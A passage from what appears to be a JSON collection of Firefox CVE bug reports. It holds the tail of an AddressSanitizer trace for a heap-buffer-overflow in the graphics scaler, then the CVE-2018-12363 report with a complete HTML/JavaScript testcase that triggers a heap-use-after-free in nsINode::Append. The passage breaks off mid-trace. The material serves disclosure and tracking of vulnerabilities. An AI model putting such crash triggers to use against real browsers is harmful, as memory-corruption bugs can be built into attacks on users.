/builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:463:5 #25 0x7f365c3d4882 in mozilla::layers::CompositorBridgeParent::CompositeToTarget(mozilla::gfx::DrawTarget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeParent.cpp:1022:18 #26 0x7f365c3eae75 in mozilla::layers::CompositorVsyncScheduler::Composite(mozilla::TimeStamp) /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorVsyncScheduler.cpp:243:27 #27 0x7f365c438e60 in applyImpl<mozilla::layers::CompositorVsyncScheduler, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp), StoreCopyPassByConstLRef<mozilla::TimeStamp> , 0> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1164:12 #28 0x7f365c438e60 in apply<mozilla::layers::CompositorVsyncScheduler, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1170 #29 0x7f365c438e60 in mozilla::detail::RunnableMethodImpl<mozilla::layers::CompositorVsyncScheduler*, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp), true, (mozilla::RunnableKind)1, mozilla::TimeStamp>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1215 #30 0x7f365a99cb23 in RunTask /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:452:9 #31 0x7f365a99cb23 in DeferOrRunPendingTask /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:460 #32 0x7f365a99cb23 in MessageLoop::DoWork() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:535 #33 0x7f365a99ea98 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/chromium/src/base/message_pump_default.cc:36:31 #34 0x7f365a99a139 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #35 0x7f365a99a139 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #36 0x7f365a99a139 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #37 0x7f365a9b830f in base::Thread::ThreadMain() /builds/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:181:16 #38 0x7f365a9aaf1c in ThreadFunc(void*) /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:38:13 #39 0x7f367b88a7fb in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x77fb) #40 0x7f367a8b8b5e in clone (/lib/x86_64-linux-gnu/libc.so.6+0x114b5e) 0x6210023424fc is located 4 bytes to the left of 4111-byte region [0x621002342500,0x62100234350f) allocated by thread T30 (Compositor) here: #0 0x4c54b3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x7f365bd6bb26 in Realloc /builds/worker/workspace/build/src/gfx/2d/Tools.h:205:41 #2 0x7f365bd6bb26 in mozilla::gfx::SourceSurfaceAlignedRawData::Init(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool, unsigned char, int) /builds/worker/workspace/build/src/gfx/2d/SourceSurfaceRawData.cpp:68 #3 0x7f365bbc94dc in mozilla::gfx::Factory::CreateDataSourceSurface(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat, bool) /builds/worker/workspace/build/src/gfx/2d/Factory.cpp:1077:16 #4 0x7f365c288685 in mozilla::layers::WrappingTextureSourceYCbCrBasic::GetSurface(mozilla::gfx::DrawTarget*) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:124:18 #5 0x7f365c25c61b in void mozilla::layers::BasicCompositor::DrawGeometry<mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> >(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, bool) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:770:29 #6 0x7f365c25af0e in mozilla::layers::BasicCompositor::DrawQuad(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:644:3 #7 0x7f365bfb24be in mozilla::layers::Compositor::DrawGeometry(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/Compositor.cpp:227:5 #8 0x7f365c36ef95 in DrawGeometry /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/layers/Compositor.h:304:5 #9 0x7f365c36ef95 in mozilla::layers::ImageHost::Composite(mozilla::layers::Compositor*, mozilla::layers::LayerComposite*, mozilla::layers::EffectChain&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SamplingFilter, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const*, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ImageHost.cpp:298 #10 0x7f365c3c4feb in mozilla::layers::ImageLayerComposite::RenderLayer(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&)::$_0::operator()(mozilla::layers::EffectChain&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) const /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:106:17 #11 0x7f365c373a9e in RenderWithAllMasks<(lambda at /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:104:22)> /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.h:738:5 #12 0x7f365c373a9e in mozilla::layers::ImageLayerComposite::RenderLayer(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:103 #13 0x7f365c35c3e6 in void mozilla::layers::RenderLayers<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:443:22 #14 0x7f365c3595de in void mozilla::layers::RenderIntermediate<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, RefPtr<mozilla::layers::CompositingRenderTarget>) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:554:3 #15 0x7f365c328439 in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:273:9 #16 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #17 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #18 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #19 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #20 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #21 0x7f365c32b81e in void mozilla::layers::ContainerPrepare<mozilla::layers::RefLayerComposite>(mozilla::layers::RefLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #22 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #23 0x7f365c3854c0 in mozilla::layers::LayerManagerComposite::Render(mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:944:18 #24 0x7f365c383244 in mozilla::layers::LayerManagerComposite::UpdateAndRender() /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:533:3 #25 0x7f365c381b26 in mozilla::layers::LayerManagerComposite::EndTransaction(mozilla::TimeStamp const&, mozilla::layers::LayerManager::EndTransactionFlags) /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:463:5 #26 0x7f365c3d4882 in mozilla::layers::CompositorBridgeParent::CompositeToTarget(mozilla::gfx::DrawTarget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const*) /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeParent.cpp:1022:18 #27 0x7f365c3eae75 in mozilla::layers::CompositorVsyncScheduler::Composite(mozilla::TimeStamp) /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorVsyncScheduler.cpp:243:27 #28 0x7f365c438e60 in applyImpl<mozilla::layers::CompositorVsyncScheduler, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp), StoreCopyPassByConstLRef<mozilla::TimeStamp> , 0> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1164:12 #29 0x7f365c438e60 in apply<mozilla::layers::CompositorVsyncScheduler, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp)> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1170 #30 0x7f365c438e60 in mozilla::detail::RunnableMethodImpl<mozilla::layers::CompositorVsyncScheduler*, void (mozilla::layers::CompositorVsyncScheduler::*)(mozilla::TimeStamp), true, (mozilla::RunnableKind)1, mozilla::TimeStamp>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1215 #31 0x7f365a99cb23 in RunTask /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:452:9 #32 0x7f365a99cb23 in DeferOrRunPendingTask /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:460 #33 0x7f365a99cb23 in MessageLoop::DoWork() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:535 #34 0x7f365a99ea98 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/chromium/src/base/message_pump_default.cc:36:31 #35 0x7f365a99a139 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #36 0x7f365a99a139 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #37 0x7f365a99a139 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #38 0x7f365a9b830f in base::Thread::ThreadMain() /builds/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:181:16 Thread T30 (Compositor) created by T0 here: #0 0x4ae80d in __interceptor_pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:204:3 #1 0x7f365a9a887f in CreateThread /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:135:14 #2 0x7f365a9a887f in PlatformThread::Create(unsigned long, PlatformThread::Delegate*, unsigned long*) /builds/worker/workspace/build/src/ipc/chromium/src/base/platform_thread_posix.cc:146 #3 0x7f365a9b7caf in base::Thread::StartWithOptions(base::Thread::Options const&) /builds/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:99:8 #4 0x7f365c3e994a in CreateCompositorThread /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorThread.cpp:102:26 #5 0x7f365c3e994a in mozilla::layers::CompositorThreadHolder::CompositorThreadHolder() /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorThread.cpp:52 #6 0x7f365c3e9c03 in mozilla::layers::CompositorThreadHolder::Start() /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorThread.cpp:124:33 #7 0x7f365c4b9322 in gfxPlatform::InitLayersIPC() /builds/worker/workspace/build/src/gfx/thebes/gfxPlatform.cpp:1038:5 #8 0x7f365c4b5037 in gfxPlatform::Init() /builds/worker/workspace/build/src/gfx/thebes/gfxPlatform.cpp:774:5 #9 0x7f365c4b242b in gfxPlatform::GetPlatform() /builds/worker/workspace/build/src/gfx/thebes/gfxPlatform.cpp:533:9 #10 0x7f3661c0b54e in CreateVsyncRefreshTimer /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1023:5 #11 0x7f3661c0b54e in nsRefreshDriver::ChooseTimer() const /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1139 #12 0x7f3661c0e631 in nsRefreshDriver::EnsureTimerStarted(nsRefreshDriver::EnsureTimerStartedFlags) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1375:34 #13 0x7f3661e02536 in ObserveStyleFlushes /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:654:7 #14 0x7f3661e02536 in EnsureStyleFlush /builds/worker/workspace/build/src/layout/base/nsIPresShellInlines.h:50 #15 0x7f3661e02536 in nsPresContext::MediaFeatureValuesChanged(mozilla::MediaFeatureChange const&) /builds/worker/workspace/build/src/layout/base/nsPresContext.h:297 #16 0x7f3661d5f576 in SetVisibleArea /builds/worker/workspace/build/src/layout/base/nsPresContext.h:473:9 #17 0x7f3661d5f576 in nsDocumentViewer::InitPresentationStuff(bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:721 #18 0x7f3661d5e950 in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:944:10 #19 0x7f3661d5da27 in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:664:10 #20 0x7f3664f1557f in nsDocShell::SetupNewViewer(nsIContentViewer*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9096:7 #21 0x7f3664f13eeb in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6903:17 #22 0x7f3664f22546 in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool, bool) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7784:14 #23 0x7f3664fa494f in nsWebShellWindow::Initialize(nsIXULWindow*, nsIXULWindow*, nsIURI*, int, int, bool, nsITabParent*, mozIDOMWindowProxy*, nsWidgetInitData&) /builds/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:237:21 #24 0x7f3664f9f1c1 in nsAppShellService::JustCreateTopWindow(nsIXULWindow*, nsIURI*, unsigned int, int, int, bool, nsITabParent*, mozIDOMWindowProxy*, nsWebShellWindow**) /builds/worker/workspace/build/src/xpfe/appshell/nsAppShellService.cpp:736:25 #25 0x7f3664fa0a3a in nsAppShellService::CreateTopLevelWindow(nsIXULWindow*, nsIURI*, unsigned int, int, int, nsITabParent*, mozIDOMWindowProxy*, nsIXULWindow**) /builds/worker/workspace/build/src/xpfe/appshell/nsAppShellService.cpp:200:8 #26 0x7f366577d6af in nsAppStartup::CreateChromeWindow2(nsIWebBrowserChrome*, unsigned int, nsITabParent*, mozIDOMWindowProxy*, unsigned long, bool*, nsIWebBrowserChrome**) /builds/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:680:15 #27 0x7f36658ee907 in nsWindowWatcher::CreateChromeWindow(nsTSubstring<char> const&, nsIWebBrowserChrome*, unsigned int, nsITabParent*, mozIDOMWindowProxy*, unsigned long, nsIWebBrowserChrome**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:469:21 #28 0x7f36658ec3db in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:939:14 #29 0x7f36658e6b8f in nsWindowWatcher::OpenWindow(mozIDOMWindowProxy*, char const*, char const*, char const*, nsISupports*, mozIDOMWindowProxy**) /builds/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:328:10 #30 0x7f3659b87701 in NS_InvokeByIndex /builds/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:106 #31 0x7f365b48c90e in Invoke /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1951:12 #32 0x7f365b48c90e in Call /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1267 #33 0x7f365b48c90e in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1234 #34 0x7f365b4935a8 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:911:12 #35 0x7f3665c74757 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #36 0x7f3665c74757 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #37 0x7f3665c5f211 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #38 0x7f3665c5f211 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3084 #39 0x7f3665c4565a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #40 0x7f3665c77bf4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:700:15 #41 0x7f3665d161af in ExecuteInExtensibleLexicalEnvironment(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:460:12 #42 0x7f3665d16e4f in js::ExecuteInJSMEnvironment(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, JS::AutoVector<JSObject*>&) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:546:12 #43 0x7f3665d16a53 in js::ExecuteInJSMEnvironment(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:504:12 #44 0x7f365b36ee37 in mozJSComponentLoader::ObjectForLocation(ComponentLoaderInfo&, nsIFile*, JS::MutableHandle<JSObject*>, JS::MutableHandle<JSScript*>, char**, bool, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/xpconnect/loader/mozJSComponentLoader.cpp:925:25 #45 0x7f365b36c362 in mozJSComponentLoader::LoadModule(mozilla::FileLocation&) /builds/worker/workspace/build/src/js/xpconnect/loader/mozJSComponentLoader.cpp:442:10 #46 0x7f3659b09e29 in Load /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:717:24 #47 0x7f3659b09e29 in nsFactoryEntry::GetFactory() /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1748 #48 0x7f3659b0aaba in nsComponentManagerImpl::CreateInstanceByContractID(char const*, nsISupports*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1046:41 #49 0x7f3659b020cd in nsComponentManagerImpl::GetServiceByContractID(char const*, nsID const&, void**) /builds/worker/workspace/build/src/xpcom/components/nsComponentManager.cpp:1409:10 #50 0x7f3659b10b15 in CallGetService /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:67:43 #51 0x7f3659b10b15 in nsGetServiceByContractIDWithError::operator()(nsID const&, void**) const /builds/worker/workspace/build/src/xpcom/components/nsComponentManagerUtils.cpp:292 #52 0x7f36599cc69a in nsCOMPtr_base::assign_from_gs_contractid_with_error(nsGetServiceByContractIDWithError const&, nsID const&) /builds/worker/workspace/build/src/xpcom/base/nsCOMPtr.cpp:106:7 #53 0x7f3665993e98 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:1036:5 #54 0x7f3665993e98 in nsAppStartupNotifier::Observe(nsISupports*, char const*, char16_t const*) /builds/worker/workspace/build/src/toolkit/xre/nsAppStartupNotifier.cpp:59 #55 0x7f3665985e88 in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4664:22 #56 0x7f366598970d in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4979:8 #57 0x7f366598abd4 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:5071:21 #58 0x4f4ef5 in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:231:22 #59 0x4f4ef5 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:304 #60 0x7f367a7c51c0 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x211c0) SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/build/src/gfx/2d/ssse3-scaler.c:202:16 in ssse3_fetch_horizontal Shadow bytes around the buggy address: 0x0c4280460440: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa 0x0c4280460450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4280460460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4280460470: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c4280460480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c4280460490: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fa] 0x0c42804604a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c42804604b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c42804604c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c42804604d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c42804604e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12958==ABORTING"
      }
    ],
    "CVE-2018-12363": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1464784",
        "title": "heap-use-after-free in nsINode::Append",
        "description": "The following testcase crashes the latest ASAN build of Firefox 62.0a1 (SourceStamp=043e4ab6e72469ed8121f4da98dcdfef983a49d9). It requires a fuzzing build (--enable-fuzzing) and the pref fuzzing.enabled=true <script> function start() { o13=(new DOMParser()).parseFromString(\"<html xmlns='http://www.w3.org/1999/xhtml'><s></s></html>\",'text/html'); o17=o13.all[3]; o54=(new DOMParser()).parseFromString(\"<html xmlns='http://www.w3.org/1999/xhtml'><input></input></html>\",'text/html'); o58=o54.all[3]; o60=(new DOMParser()).parseFromString(\"<html xmlns='http://www.w3.org/1999/xhtml'><li></li></html>\",'text/html'); o61=o60.all[0]; o66=(new DOMParser()).parseFromString(\"<html xmlns='http://www.w3.org/1999/xhtml'><tbody></tbody></html>\",'text/html'); o17.addEventListener('DOMNodeRemoved',fun0); try{o72=o66.prepend(o61,undefined);}catch(e){} o77=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o61.appendChild(o77); o79=o77.cloneNode(true); document.documentElement.append(o17); } var count = 0; function fun0() { count++; if(count==1) { o79.append(o58,o17,undefined); } else if(count==2) { document.documentElement.prepend(o79); o149=o58.parentNode; document.documentElement.append(o149); document.documentElement.prepend(o17,undefined); o149=null;o58=null;o17=null;o79=null;o66=null;o13=null;o54=null;o60=null;o77=null; FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect(); } else if(count==4) { document.documentElement.prepend(undefined,o61); } } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==12349==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d0002671c8 at pc 0x7fcb7cf962d0 bp 0x7ffc143ad2b0 sp 0x7ffc143ad2a8 READ of size 8 at 0x61d0002671c8 thread T0 (file:// Content) #0 0x7fcb7cf962cf in CreateTextNode /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5763:44 #1 0x7fcb7cf962cf in GetNodeFromNodeOrString(mozilla::dom::OwningNodeOrString const&, nsIDocument*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1429 #2 0x7fcb7cf59ac2 in ConvertNodesOrStringsIntoNode(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, nsIDocument*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1453:35 #3 0x7fcb7cf5ac33 in nsINode::Append(mozilla::dom::Sequence<mozilla::dom::OwningNodeOrString> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1638:5 #4 0x7fcb7ec79dd6 in mozilla::dom::ElementBinding::append(JSContext*, JS::Handle<JSObject*>, mozilla::dom::Element*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:5175:9 #5 0x7fcb7f381b81 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3280:13 #6 0x7fcb85c4c157 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #7 0x7fcb85c4c157 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) 